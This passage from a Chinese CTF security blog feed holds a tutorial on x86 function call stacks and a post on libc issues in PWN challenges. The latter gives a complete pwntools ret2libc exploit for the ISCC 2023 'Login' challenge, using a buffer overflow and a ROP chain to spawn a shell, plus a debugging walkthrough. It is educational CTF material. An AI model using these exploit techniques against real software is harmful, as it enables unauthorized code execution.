xy.txt 里的坐标转化成图像</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gnuplotgnuplot<span class="token operator">></span> plot <span class="token string">"xy.txt"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果没有安装 <code>gnuplot</code> 手动安装即可（需要同时安装 <code>gnuplot</code> 和 <code>gnuplot-x11</code> 才能画出图）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> update <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> <span class="token function">apt</span> upgrade<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> gnuplot gnuplot-x11gnuplot <span class="token parameter variable">-v</span>   <span class="token comment"># 验证安装</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>Windows 版 <code>gnuplot</code> 下载地址：<a href="http://www.gnuplot.info/">gnuplot homepage</a></p><hr>]]></content>
    
    
    <summary type="html">CTF 杂项中流量分析相关的知识积累</summary>
    
    
    
    <category term="安全杂项" scheme="https://www.uf4te.cn/categories/%E5%AE%89%E5%85%A8%E6%9D%82%E9%A1%B9/"/>
    
    
    <category term="CTF" scheme="https://www.uf4te.cn/tags/CTF/"/>
    
    <category term="Misc" scheme="https://www.uf4te.cn/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>函数调用栈</title>
    <link href="https://www.uf4te.cn/posts/c68710a5.html"/>
    <id>https://www.uf4te.cn/posts/c68710a5.html</id>
    <published>2023-12-05T16:00:00.000Z</published>
    <updated>2024-06-05T06:37:15.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="函数调用栈"><a href="#函数调用栈" class="headerlink" title="函数调用栈"></a>函数调用栈</h1><blockquote><p>以 32 位程序的寄存器为例</p></blockquote><p>在学汇编时我们知道，函数调用通常有如下写法：</p><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">main:push ebpmov ebp<span class="token punctuation">,</span> esp...sub esp<span class="token punctuation">,</span> 20h   <span class="token comment">; 假设这中间的进栈操作使 esp 减了 20h</span>...call fun...leaveretfun:push ebpmov ebp<span class="token punctuation">,</span> esp...sub esp<span class="token punctuation">,</span> 30h   <span class="token comment">; 假设这中间的进栈操作使 esp 减了 30h</span>...leaveret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对应 C 语言中的：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token function">fun</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>关于理解函数的调用过程，我们主要要抓住 ESP、EBP、EIP 这三个寄存器的变化</p><p><strong>注意：学习这里必须要分清地址和地址中存放的值，这两者是不一样的，不然容易懵</strong></p><p><strong>就像 C 语言中指针 p 指向的是一个内存单元，也就是一个地址；而 <code>*p</code> 指的是这个内存单元中存放的数据，是一个值</strong></p></blockquote><h2 id="执行-main-函数"><a href="#执行-main-函数" class="headerlink" title="执行 main 函数"></a>执行 main 函数</h2><p>首先来看 main 函数：</p><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">main:push ebpmov ebp<span class="token punctuation">,</span> esp...sub esp<span class="token punctuation">,</span> 20h   <span class="token comment">; 假设这中间的进栈操作使 esp 减了 20h</span>...call fun...leaveret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li><p>在执行 <code>push ebp</code> 时，假设初始 ESP 指向 <code>0xffffce2c</code> 地址处，首先 <code>esp = esp - 4</code>，再将原本 EBP 的值 <code>push</code> 到 ESP 所指向的 <code>0xffffce28</code> 地址处</p></li><li><p>在执行 <code>mov ebp, esp</code> 时，将 ESP 的值赋值给 EBP，即：让 EBP 指向当前 ESP 所在地址，故此时 ESP 和 EBP 都指向 <code>0xffffce28</code> 地址处</p></li><li><p>在执行 <code>sub esp, 20h</code> 时，这里假设是在模拟函数中的各种进栈操作，使得 ESP 指向 <code>0xffffce08</code> 地址处，而 EBP 不会随着进栈而改变</p></li></ol><p>执行到这里，栈中的变化如下：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%881.png" alt="函数调用栈1.png"></p><ol start="4"><li>当执行 <code>call fun</code> 时，<code>call</code> 指令相当于：</li></ol><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">push eipjmp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>EIP 就是 <code>call fun</code> 这条指令的下一条指令的地址</p><p>首先 <code>esp = esp - 4</code>，再将 <code>call fun</code> 这条指令的下一条指令的地址填到 ESP 所指向的 <code>0xffffce04</code> 地址处</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%882.png" alt="函数调用栈2.png"></p><hr><h2 id="跳转到-fun-函数"><a href="#跳转到-fun-函数" class="headerlink" title="跳转到 fun 函数"></a>跳转到 fun 函数</h2><p>然后来看 fun 函数：</p><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">fun:push ebpmov ebp<span class="token punctuation">,</span> esp...sub esp<span class="token punctuation">,</span> 30h   <span class="token comment">; 假设这中间的进栈操作使 esp 减了 30h</span>...leaveret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="5"><li>fun 中的指令一直执行到 <code>sub esp, 30h</code> 都与 main 中开始时一样，不再赘述：</li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%883.png" alt="函数调用栈3.png"></p><ol start="6"><li>当 fun 函数的功能执行完后，会执行 <code>leave</code> 指令，<code>leave</code> 指令相当于：</li></ol><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov esp<span class="token punctuation">,</span> ebp  <span class="token comment">; 恢复栈指针</span>pop ebp       <span class="token comment">; 恢复基址指针</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>注意：</p><p>在函数开始时</p><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">push ebp  mov ebp<span class="token punctuation">,</span> esp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这两条指令其实可以合并为一个 <code>enter</code> 指令，他们是等价的</p><p><strong><code>enter</code> 指令与 <code>leave</code> 指令的操作正好相反，<code>enter</code> 指令位于函数的开始，<code>leave</code> 指令位于函数的结尾，用来恢复栈帧</strong></p></blockquote><p>执行 <code>mov esp, ebp</code> 后，会将 EBP 的值赋值给 ESP，此时 ESP 会回到 EBP 所指向的地址 <code>0xffffce00</code> 处</p><p>执行 <code>pop ebp</code> 后，会先将 ESP 所指向的地址 <code>0xffffce00</code> 中存放的数据 <code>0xffffce28</code> 出栈送入 EBP，因此这时 EBP 会指向 <code>0xffffce28</code> 地址处；然后，由于出栈的 pop 操作使得 <code>esp = esp + 4</code>，因此执行 <code>pop ebp</code> 后 ESP 指向 <code>0xffffce04</code> 地址处</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%884.png" alt="函数调用栈4.png"></p><ol start="7"><li>接着执行 <code>ret</code> 指令，<code>ret</code> 指令相当于：</li></ol><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">pop eip   <span class="token comment">; 这样写是方便理解，实际上不存在 pop eip 这个汇编指令</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>先将此时 ESP 所指向的地址 <code>0xffffce04</code> 中存放的 <code>call fun</code> 指令的下一条指令的地址出栈送入 EIP，然后由于出栈的 pop 操作使得 <code>esp = esp + 4</code>，因此执行 <code>pop ebp</code> 后 ESP 指向 <code>0xffffce08</code> 地址处</p><p>EIP 中存放的是下一条要执行的指令的地址，由于这里修改了 EIP 的值为 <code>call fun</code> 指令的下一条指令的地址</p><p>因此这时程序会转而执行 <code>call fun</code> 指令的下一条指令，<strong>程序也就从 fun 函数回到了 main 函数中</strong></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%885.png" alt="函数调用栈5.png"></p><p>到这里，栈又回到了 main 中 <code>call fun</code> 这句执行之前的样子</p><blockquote><p><em>注意：栈中的数据出栈后仍然会保存在内存单元中，只是 ESP 的值改变了，计算机认为出栈后的数据已经不在栈里面了（计算机根据 EBP 和 ESP 来识别栈空间），但这个数据还是在内存单元中保存着，不会因为出栈而被清空</em></p></blockquote><hr><h2 id="回到-main-函数"><a href="#回到-main-函数" class="headerlink" title="回到 main 函数"></a>回到 main 函数</h2><ol start="8"><li>当 main 中剩余的操作执行完后，也会执行 <code>leave</code> 指令</li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%886.png" alt="函数调用栈6.png"></p><p>这时候 ESP 回到最开始的 <code>0xffffce2c</code> 地址处，EBP 也回到原本 EBP 所在的地址处</p><p>最后通过 <code>ret</code> 指令回到 main 函数被调用时的位置，整个程序的主函数执行到这里就结束了</p>]]></content>
    
    
    <summary type="html">简单记录一下函数在调用过程中栈的变化，对于理解 ROP 和程序的执行流程很有帮助</summary>
    
    
    
    <category term="二进制漏洞利用" scheme="https://www.uf4te.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="Pwn" scheme="https://www.uf4te.cn/tags/Pwn/"/>
    
    <category term="x86汇编" scheme="https://www.uf4te.cn/tags/x86%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>PWN中程序的libc问题</title>
    <link href="https://www.uf4te.cn/posts/1205d4ce.html"/>
    <id>https://www.uf4te.cn/posts/1205d4ce.html</id>
    <published>2023-11-23T16:00:00.000Z</published>
    <updated>2024-06-05T06:37:10.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="libc"><a href="#libc" class="headerlink" title="libc"></a>libc</h1><blockquote><p><code>libc.so</code> 是一个动态链接文件，在程序运行的时候，才会去寻找库文件，取出里面的代码放进内存运行（像平时在运行 Windows 时弹出的 <code>&quot;找不到 xxx.dll文件&quot;</code> 其实就是动态链接）</p><p><strong>一般来说，libc 中存放的都是使用过的函数、字符串等</strong></p></blockquote><ol><li><strong>在 <code>libc.so</code> 动态链接库中的函数之间相对偏移是固定的。</strong> 也就是说，虽然程序在执行过程中，真实地址会随着每一次加载 libc 而变化，但是两个函数之间的偏移量总是固定不变的</li></ol><p>假设文件中三个函数的地址是 0x40010、0x40020、0x40050，但是加载到内存后会增加一个基地址，假设基地址为 0x000100，虽然地址变了，但他们之间的相对偏移还是一样的</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E5.png" alt="栈溢出漏洞5.png"></p><ol start="2"><li><strong>根据系统的版本不同，系统中所使用的 libc 的版本也会有所差别。</strong> 所以我们首先需要确定程序所使用的是哪一个版本的 libc，这里可以用 <code>LibcSearcher</code> 来寻找（也有的题会直接给出 libc 文件）</li></ol><p>不过 <code>LibcSearcher</code> 找到的 libc 版本可能有多个，有时候需要去判断，而且得到的字符串的地址不一定刚刚好，可能需要通过调试去验证。另外，也可以通过网站来查询：<a href="https://libc.blukat.me/">libc database search</a></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E7.png" alt="栈溢出漏洞7.png"></p><blockquote><p>注意：<br>通过 ret2libc 计算出 libc 基地址时，<strong>libc 基地址 <code>libcbase</code> 最后三位一般是全 0</strong>，可用于判断是否计算正确，libc 基地址可以在 GDB 中使用 <code>vmmap</code> 进行查看</p><p>另外，<strong>libc 中的函数偏移在加载到内存后地址最后三位是不会变的</strong>，例如：<code>system()</code> 函数在 libc 中偏移量为 0x48<em>E50</em>，则加载到内存中可能为 0xF7D1B<em>E50</em></p><p><mark>与操作系统的 4 KB 分页机制有关，4 KB &#x3D; 4 * 1024 (D) &#x3D; 1000 (H)</mark></p></blockquote><hr><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><p>以 ISCC 2023 的一道 PWN 题为例：<a href="https://iscc.isclab.org.cn/">【ISCC 2023】Login</a></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-Login1.png" alt="ISCC2023-Login1.png"></p><p>程序逻辑如下：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-Login3.png" alt="ISCC2023-Login3.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-Login5.png" alt="ISCC2023-Login5.png"></p><p>函数 <code>main()</code> 栈中的情况：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-Login4.png" alt="ISCC2023-Login4.png"></p><p>思路比较简单，首先通过输入 buf 来修改 v6 的值为 365696460 （0x15CC15CC） 绕过 if 判断</p><p>然后通过 <code>print_name()</code> 函数中的 <code>memcpy()</code> 将 v4 复制到 dest 中，由于 v4 长度为 0x100，而 dest 长度为 0x20，可以利用 v4 覆盖 dest 来修改返回地址</p><p>而题目中没有 <code>system()</code> 函数和 <code>&quot;/bin/sh&quot;</code>，但是给出了 libc 文件</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-Login6.png" alt="ISCC2023-Login6.png"></p><p>同时程序输出了 stdin 的真实地址 （通过动态调试发现其实是 <code>_IO_2_1_stdin_</code> 而不是 <code>stdin</code>）</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-Login9.png" alt="ISCC2023-Login9.png"></p><p>因此使用 ret2libc 来获取 <code>system()</code> 函数和 <code>&quot;/bin/sh&quot;</code> 的地址</p><p>在 Ubuntu 16.04 下，使用如下 exp 直接获得 shell：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./Login'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./Login'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Here is a tip: "</span><span class="token punctuation">)</span>stdin_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"\n"</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token comment"># 获取程序输出的地址</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>stdin_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"input the username:\n"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">-</span> <span class="token number">0x4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">365696460</span><span class="token punctuation">)</span> <span class="token comment"># 修改 v6 绕过 if</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment"># 利用 _IO_2_1_stdin_ 计算 libc 偏移</span>libcbase <span class="token operator">=</span> stdin_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdin_'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>bin_sh <span class="token operator">=</span> libcbase <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x4008c3</span> <span class="token comment"># 64 位传参</span>ret <span class="token operator">=</span> <span class="token number">0x400599</span> <span class="token comment"># 用于堆栈平衡（glibc 2.27 以下可以不加 ret, 不影响程序执行流）</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"input the password:\n"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>由于在 Ubuntu 16.04 中，glibc 2.27 以下版本不存在 <code>system()</code> 函数中 <code>movaps</code> 指令操作 XMM 寄存器的堆栈平衡问题，因此 payload 中 <code>p64(ret)</code> 可加可不加</p><p><mark>但在 Ubuntu 22.04 中就必须得加，索性养成习惯直接加上</mark></p><p><em>详见《<a href="PWN%E4%B8%AD64%E4%BD%8D%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1.md">PWN中64位程序的堆栈平衡</a>》一文</em></p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/ISCC2023-Login11.png" alt="ISCC2023-Login11.png"></p><p>但在 Ubuntu 22.04 中使用同样的 exp，就无法获得 shell：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%981.png" alt="PWN中程序的libc问题1.png"></p><blockquote><p>玄学的问题出现了：</p><p>同样的脚本，同样的程序，在 Ubuntu 16.04 可以打通，在 Ubuntu 22.04 就打不通</p></blockquote><hr><h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><p>在 Ubuntu 22.04 中调试分析一下</p><p>在第二个 payload 发送之前附加 gdb 调试，完整测试脚本如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./Login'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./Login'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.23.so'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Here is a tip: "</span><span class="token punctuation">)</span>stdin_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"\n"</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token comment"># 获取程序输出的地址</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>stdin_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"input the username:\n"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">-</span> <span class="token number">0x4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">365696460</span><span class="token punctuation">)</span> <span class="token comment"># 修改 v6 绕过 if</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token comment"># 利用 _IO_2_1_stdin_ 计算 libc 偏移</span>libcbase <span class="token operator">=</span> stdin_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdin_'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>bin_sh <span class="token operator">=</span> libcbase <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x4008c3</span> <span class="token comment"># 64 位传参</span>ret <span class="token operator">=</span> <span class="token number">0x400599</span> <span class="token comment"># 用于堆栈平衡（glibc 2.27 以下可以不加 ret, 不影响程序执行流）</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"input the password:\n"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x20</span> <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token comment"># 附加 gdb 调试</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>pause<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行到 <code>call print_name</code> 处</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%982.png" alt="PWN中程序的libc问题2.png"></p><p>可以看到 <code>print_name()</code> 函数的返回地址没有问题，为 <code>pop rdi</code></p><p>单步 si 进入 <code>print_name()</code> 函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%983.png" alt="PWN中程序的libc问题3.png"></p><p><code>print_name()</code> 函数结束后，确实返回到 <code>0x4008c3 &lt;__libc_csu_init+99&gt;</code> 处执行了 <code>pop rdi</code> 指令，也没有问题</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%984.png" alt="PWN中程序的libc问题4.png"></p><p>执行完 <code>pop rdi</code> 指令后，正常返回到 <code>0x400599 &lt;_init+25&gt;</code> 处执行 <code>ret</code> 指令，也没有问题</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%985.png" alt="PWN中程序的libc问题5.png"></p><p><code>ret</code> 返回到 <code>0x7fb6dc29a560</code> 地址处</p><p>再次单步执行，程序便崩溃了：地址 <code>0x7fb6dc29a560</code> 不合法</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%986.png" alt="PWN中程序的libc问题6.png"></p><p>按道理说，这个地址存放的应该是 <code>system()</code> 函数的地址</p><p>回头观察执行 <code>pop rdi</code> 指令时的情况，出栈到 RDI 的地址为：<code>0x7fb6dc3e2017</code>，正常来讲这个地址应该为 <code>&quot;/bin/sh&quot;</code> 的地址</p><p>实际发现这两个地址确实都不存在：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%987.png" alt="PWN中程序的libc问题7.png"></p><hr><p>而在 Ubuntu 16.04 中使用同样的脚本进行调试时</p><p>发现最后 <code>ret</code> 的地址就是 <code>system()</code> 的地址：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%988.png" alt="PWN中程序的libc问题8.png"></p><p><code>pop rdi</code> 出栈的也是 <code>&quot;/bin/sh&quot;</code> 的地址：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%989.png" alt="PWN中程序的libc问题9.png"></p><p>没有任何问题，可以正常获得 shell</p><p>大致可以猜测应该是 Ubuntu 22.04 中 <code>system()</code> 函数和 <code>&quot;/bin/sh&quot;</code> 地址不对</p><hr><p>接下来，我们在 Ubuntu 22.04 中验证一下</p><p>先单步执行完 <code>pop rdi</code> 指令：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%9810.png" alt="PWN中程序的libc问题10.png"></p><p>此时我们查找 <code>&quot;/bin/sh&quot;</code> 和 <code>system()</code> 函数的地址：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/PWN%E4%B8%AD%E7%A8%8B%E5%BA%8F%E7%9A%84libc%E9%97%AE%E9%A2%9811.png" alt="PWN中程序的libc问题11.png"></p><p>使用 <code>set</code> 命令强行手动将 RDI 寄存器和 RIP 寄存器修改，使 RDI 存放 <code>&quot;/bin/sh&quot;</code> 的地址，RIP 存放 <code>system()</code> 函数的地址</p><p>然后 si 单步步入，发现已经正常进入 <code>system()</code> 